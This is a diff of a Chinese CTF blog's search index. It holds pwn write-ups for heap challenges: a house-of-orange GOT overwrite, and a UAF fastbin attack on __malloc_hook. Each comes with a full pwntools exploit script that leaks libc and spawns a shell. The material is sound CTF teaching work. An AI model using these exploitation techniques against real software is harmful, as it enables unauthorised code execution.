+<h3 id="edit"><a href="#edit" class="headerlink" title="edit"></a>edit</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> __int64 <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  result = get_index();</span><br><span class="line">  v1 = result;</span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD)result != <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = *(_QWORD *)&amp;heapArray[<span class="number">16</span> * (<span class="keyword">signed</span> <span class="keyword">int</span>)result + <span class="number">256</span>];</span><br><span class="line">    <span class="keyword">if</span> ( result )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;content: &quot;</span>);</span><br><span class="line">      result = sub_400916(*(_QWORD *)&amp;heapArray[<span class="number">16</span> * v1 + <span class="number">256</span>], (<span class="keyword">unsigned</span> <span class="keyword">int</span>)*(_QWORD *)&amp;heapArray[<span class="number">16</span> * v1 + <span class="number">264</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>根据<code>size</code>决定，配合<code>add</code>函数造成了堆溢出</p>
+<h2 id="house-of-orange"><a href="#house-of-orange" class="headerlink" title="house of orange"></a>house of orange</h2><p>有一种利用堆溢出可以在没有<code>free</code>函数的情况下得到一个<code>unsortedbin</code>堆块（同理也可以得到<code>fastbin</code></p>
+<p>详情请见CTFwiki</p>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="修改topbin"><a href="#修改topbin" class="headerlink" title="修改topbin"></a>修改topbin</h3><p>首先利用堆溢出修改<code>topbin</code>的大小</p>
+<p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200916172303763.png" alt="image-20200916172303763"></p>
+<p>运行之后</p>
+<p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200916172355480.png" alt="image-20200916172355480"></p>
+<p><code>topbin</code>被修改为一个小的值</p>
+<h3 id="得到fastbin"><a href="#得到fastbin" class="headerlink" title="得到fastbin"></a>得到fastbin</h3><p>把剩下的topbin分配掉，留下一个<code>0x90</code>的大小</p>
+<p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200916172714541.png" alt="image-20200916172714541"></p>
+<p>然后分配一个超过它大小的堆块，这个堆块就会进入<code>fastbin</code>(否则进入<code>unsortedbin</code>)</p>
+<p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200916172820568.png" alt="image-20200916172820568"></p>
+<p>并且这个<code>fastbin</code>的<code>fd</code>指针可控（堆溢出）</p>
+<p>修改它为<code>memset@got</code>的地址，就可以修改<code>memset    </code>函数</p>
+<p>这里修改成<code>printf</code>然后利用格式化字符串泄漏libc</p>
+<p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200916173137032.png" alt="image-20200916173137032"></p>
+<p>得到了libc之后在重放一次上面的操作修改<code>atoi@got</code>为<code>system</code>或者<code>one_gadget</code>即可</p>
+<p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20200916173416122.png" alt="image-20200916173416122"></p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/home/shiroha/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/libc-2.23.so&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>(<span class="params">command = <span class="string">&quot;&quot;</span></span>):</span></span><br><span class="line">    gdb.attach(sh, command)</span><br><span class="line">    <span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span>(<span class="params">command</span>):</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="built_in">str</span>(command))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;idx:&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx, size, content</span>):</span></span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    index(idx)</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;size:&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    <span class="keyword">if</span> content != <span class="string">&quot;&quot;</span>:</span><br><span class="line">        sh.sendafter(<span class="string">&quot;content:&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, content</span>):</span></span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    index(idx)</span><br><span class="line">    sh.sendafter(<span class="string">&quot;content:&quot;</span>, content)</span><br><span class="line"></span><br><span class="line">put_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">put_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">printf_plt = elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x80</span>, <span class="string">&#x27;a\n&#x27;</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">&quot;a&quot;</span> * <span class="number">0x18</span> + p64(<span class="number">0xfe1</span>))</span><br><span class="line">[add(<span class="number">0</span>, <span class="number">0x80</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x80</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x1a</span>)]</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x18</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x8</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x60</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x71</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x90</span>, <span class="string">&#x27;%17$p&#x27;</span>.ljust(<span class="number">0x90</span>, <span class="string">&#x27;\x01&#x27;</span>))</span><br><span class="line"></span><br><span class="line">memset_addr = elf.got[<span class="string">&#x27;memset&#x27;</span>]</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>) + p64(<span class="number">0x6021c0</span>))</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x60</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x60</span>, <span class="string">&#x27;%17$p&#x27;</span>.ljust(<span class="number">0x60</span>, <span class="string">&#x27;\x01&#x27;</span>))</span><br><span class="line">edit(<span class="number">0</span>, p64(memset_addr))</span><br><span class="line">edit(<span class="number">1</span>, p64(printf_plt))</span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x90</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;\x30&#x27;</span>)</span><br><span class="line">c = <span class="built_in">int</span>(<span class="string">&#x27;\x30&#x27;</span> + sh.recvuntil(<span class="string">&#x27;\x01&#x27;</span>)[:-<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">print(<span class="string">&quot;c ==&gt; &quot;</span> + <span class="built_in">hex</span>(c))</span><br><span class="line">base = c - libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>] - <span class="number">240</span></span><br><span class="line">print(<span class="string">&quot;base ==&gt; &quot;</span> + <span class="built_in">hex</span>(base))</span><br><span class="line"></span><br><span class="line">system = base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">sh.send(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x90</span>)</span><br><span class="line"><span class="comment"># one = [0x45226, 0x4527a, 0xf0364]</span></span><br><span class="line">edit(<span class="number">0</span>, p64(elf.got[<span class="string">&#x27;atoi&#x27;</span>]))</span><br><span class="line">edit(<span class="number">1</span>, p64(system))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>pwn</category>
+        <category>heap</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+        <tag>heap</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>一个堆溢出的小例子</title>
     <url>//an_example.html</url>
     <content><![CDATA[<ul>
@@ -1989,47 +2273,6 @@
 <p>在CPP中，new对象的时候会创建一个堆块，里面放入参数和函数的地址，这里delete p之后并没有让p指向null，所以p指针还有值，可以被调用，<code>q = srtdup(buf)</code>可以拿到q对应的堆块，<strong>改写其中的指针，使其指向buf + 8 ，然后让buf + 8指向sh()**，就可以调用</strong>sh()**函数</p>
 <p>payload如下</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&quot;./UAF&quot;</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(sh,<span class="string">&quot;&quot;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&quot;1233&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0x601160</span> + <span class="number">8</span>) + p64(<span class="number">0x40091b</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>pwn</category>
-        <category>heap</category>
-      </categories>
-      <tags>
-        <tag>pwn</tag>
-        <tag>heap</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>极光实验室二进制组考核</title>
-    <url>//aurora_bin_test.html</url>
-    <content><![CDATA[<p>极光实验室二进制组考核pwn题wp</p>
-<a id="more"></a>
-
-
-
-<h2 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h2><h3 id="main"><a href="#main" class="headerlink" title="main"></a>main</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall __noreturn <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = setbufs(a1, a2, a3);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    v3 = get_int();</span><br><span class="line">    <span class="keyword">switch</span> ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">delete</span>(v4);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        edit(v4);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        add(v4);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Wrong choice!&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="add"><a href="#add" class="headerlink" title="add"></a>add</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">add</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> nbytes; <span class="comment">// [rsp+14h] [rbp-1Ch]</span></span><br><span class="line">  <span class="keyword">int</span> nbytes_4; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Which size you want to add?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1. small&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2. big&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;3. large&quot;</span>);</span><br><span class="line">  v1 = get_int(<span class="string">&quot;3. large&quot;</span>);</span><br><span class="line">  nbytes_4 = v1;</span><br><span class="line">  <span class="keyword">if</span> ( v1 == <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    nbytes = <span class="number">104</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( v1 == <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    nbytes = <span class="number">1024</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v1 != <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Wrong size!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    nbytes = <span class="number">56</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *(_QWORD *)(<span class="number">8L</span>L * (v1 - <span class="number">1</span>) + a1) = <span class="built_in">malloc</span>(nbytes);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Your info?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, *(<span class="keyword">void</span> **)(<span class="number">8L</span>L * (nbytes_4 - <span class="number">1</span>) + a1), (<span class="keyword">unsigned</span> <span class="keyword">int</span>)nbytes);</span><br><span class="line">  *(_QWORD *)(<span class="number">8L</span>L * nbytes - <span class="number">8</span> + a1) = <span class="number">0L</span>L;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Your info:&quot;</span>);</span><br><span class="line">  write(<span class="number">1</span>, *(<span class="keyword">const</span> <span class="keyword">void</span> **)(<span class="number">8L</span>L * (nbytes_4 - <span class="number">1</span>) + a1), (<span class="keyword">unsigned</span> <span class="keyword">int</span>)nbytes);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Add successfully!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="edit"><a href="#edit" class="headerlink" title="edit"></a>edit</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">edit</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> nbytes; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Which size you want?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1. small&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2. big&quot;</span>);</span><br><span class="line">  v1 = get_int(<span class="string">&quot;2. big&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v1 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    nbytes = <span class="number">56</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v1 != <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Wrong size!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    nbytes = <span class="number">104</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v4 = v1 - <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( *(_QWORD *)(<span class="number">8L</span>L * (v1 - <span class="number">1</span>) + a1) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Your info?&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, *(<span class="keyword">void</span> **)(<span class="number">8L</span>L * v4 + a1), (<span class="keyword">unsigned</span> <span class="keyword">int</span>)nbytes);</span><br><span class="line">    *(_QWORD *)(<span class="number">8L</span>L * nbytes - <span class="number">8</span> + a1) = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Edit successfully!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">delete</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Which size you want to remove?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1. small&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2. big&quot;</span>);</span><br><span class="line">  v2 = get_int(<span class="string">&quot;2. big&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v2 != <span class="number">1</span> &amp;&amp; v2 != <span class="number">2</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Wrong size!&quot;</span>);</span><br><span class="line">  <span class="built_in">free</span>(*(<span class="keyword">void</span> **)(<span class="number">8L</span>L * (v2 - <span class="number">1</span>) + a1));</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Remove successfully!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="保护"><a href="#保护" class="headerlink" title="保护"></a>保护</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">shiroha@ubuntu:~/kaohe$ checksec heap</span><br><span class="line">[*] &#x27;/home/gstalker/kaohe/heap&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
-
-<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p><code>add</code>函数只允许3种堆块<br><code>edit</code>只允许修改两种<br><code>delete</code>也只允许释放两种<br>(那么第三种有什么用啊喂)</p>
-<h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>由于在<code>delete</code>之后没有讲指针置0,存在**<code>UAF</code>**漏洞,并且在<code>edit</code>的时候没有检查堆块是否已经被<code>free</code>,所以可以通过修改<code>fastbin</code>的<code>fd</code>指针达到任意地址写</p>
-<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>首先完善一下各个功能</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>(<span class="params">command = <span class="string">&quot;&quot;</span></span>):</span></span><br><span class="line">    gdb.attach(sh,command)</span><br><span class="line">    <span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span>(<span class="params">command</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;3. edit a block&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(command))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;3. large&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Your info?&quot;</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,content</span>):</span></span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;2. big&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Your info?&quot;</span>)</span><br><span class="line">    sh.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;2. big&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br></pre></td></tr></table></figure>
-
-<h4 id="leak-libc"><a href="#leak-libc" class="headerlink" title="leak libc"></a>leak libc</h4><p>一开始我想通过<code>unsorted bin</code>的<code>UAF</code>,但是这里并没有办法(甚至没有<code>unsorted bin</code>)<br>于是试图通过<code>fastbin</code>的<code>fd</code>指针分配到<code>got表</code>附近,泄露<code>libc</code><br>查看一下 <code>got表</code>,寻找合适的size</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x602000:	0x0000000000601e28	0x00007f1287400168</span><br><span class="line">0x602010:	0x00007f12871f0ee0	0x00000000004006a6</span><br><span class="line">0x602020:	0x00007f1286e7e690	0x00000000004006c6</span><br><span class="line">0x602030:	0x00000000004006d6	0x00007f1286f06250</span><br><span class="line">0x602040:	0x00007f1286e2f740	0x00007f1286e93130</span><br><span class="line">0x602050:	0x00007f1286e7ee70	0x0000000000400726</span><br><span class="line">0x602060:	0x0000000000400736	0x0000000000000000</span><br><span class="line">0x602070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602080 &lt;stdout&gt;:	0x00007f12871d4620	0x0000000000000000</span><br><span class="line">0x602090 &lt;stdin&gt;:	0x00007f12871d38e0	0x0000000000000000</span><br></pre></td></tr></table></figure>
-<p>看到在<code>0x602050</code>的地方有一个 <code>0x70</code>,高兴坏了,然而并不能分配到这里,而且就算是这附近的错位字节也不行(我在这里卡了好久没弄明白为什么,然后看了看<code>__malloc_hook-0x23</code>,发现错位字节的地方是<code>0x7f</code>)</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x7f12871d3aed &lt;_IO_wide_data_0+301&gt;:	0x12871d2260000000	0x000000000000007f</span><br><span class="line">0x7f12871d3afd:	0x1286e94e20000000	0x1286e94a0000007f</span><br><span class="line">0x7f12871d3b0d &lt;__realloc_hook+5&gt;:	0x000000000000007f	0x0000000000000000</span><br></pre></td></tr></table></figure>
-<p>猜想可能是size检查的时候是一个<code>int</code>为单位,再次寻找size,发现<code>0x602030</code>的地方有一个<code>0x40</code>可以利用,但是会失败,可以分配到,然而<code>0x602038</code>是<code>read</code>函数,会破坏它的指针,从而影响程序<br>最后看到<code>0x602060</code>的地方也有<code>0x40</code>,并且下面存在<code>stdin</code>和<code>stdout</code>可以泄露,将<code>fd</code>指向这里</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0x60205a</span>))</span><br><span class="line">add(<span class="number">1</span>,<span class="string">&quot;a&quot;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">c = sh.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">addr = u64(c)</span><br><span class="line">print(<span class="string">&quot;addr ==&gt; %s&quot;</span>%<span class="built_in">hex</span>(addr))</span><br><span class="line">base = addr - libc.symbols[<span class="string">&quot;_IO_2_1_stdout_&quot;</span>]</span><br><span class="line">print(<span class="string">&quot;base ==&gt; %s&quot;</span>%<span class="built_in">hex</span>(base))</span><br></pre></td></tr></table></figure>
-<h4 id="get-shell"><a href="#get-shell" class="headerlink" title="get shell"></a>get shell</h4><p>得到libc之后使用修改<code>__malloc_hook ==&gt; one_gadget</code> 就可以得到shell</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">onegadget = base + one[<span class="number">3</span>]</span><br><span class="line">realloc = base + libc.symbols[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line">malloc_hook = base + libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">add(<span class="number">2</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">2</span>,p64(malloc_hook - <span class="number">0x23</span>))</span><br><span class="line">add(<span class="number">2</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xb</span> + p64(onegadget) + p64(realloc + <span class="number">0x10</span>))</span><br></pre></td></tr></table></figure>
-<p>再一次分配一个堆块就能得到shell</p>
-]]></content>
       <categories>
         <category>pwn</category>
         <category>heap</category>
@@ -2087,6 +2330,47 @@
       <tags>
         <tag>pwn</tag>
         <tag>dosbox</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>极光实验室二进制组考核</title>
+    <url>//aurora_bin_test.html</url>
+    <content><![CDATA[<p>极光实验室二进制组考核pwn题wp</p>
+<a id="more"></a>
+
+
+
+<h2 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h2><h3 id="main"><a href="#main" class="headerlink" title="main"></a>main</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall __noreturn <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = setbufs(a1, a2, a3);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    v3 = get_int();</span><br><span class="line">    <span class="keyword">switch</span> ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">delete</span>(v4);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        edit(v4);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        add(v4);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Wrong choice!&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
